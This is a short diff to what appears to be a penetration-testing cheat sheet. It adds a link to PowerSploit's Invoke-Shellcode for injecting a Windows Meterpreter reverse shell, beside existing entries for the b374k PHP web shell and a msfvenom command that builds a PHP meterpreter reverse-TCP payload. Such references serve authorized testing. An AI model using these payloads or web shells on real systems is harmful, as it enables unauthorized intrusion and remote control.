@@ -825,6 +825,10 @@ export ip=192.168.1.100`**_
 -   PHP powered web browser Shell b374k with file upload etc.  
     [*https://github.com/b374k/b374k*](https://github.com/b374k/b374k)
 
+-   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
+    
+
 -   msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Your IP
     Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt;
     shell.php  
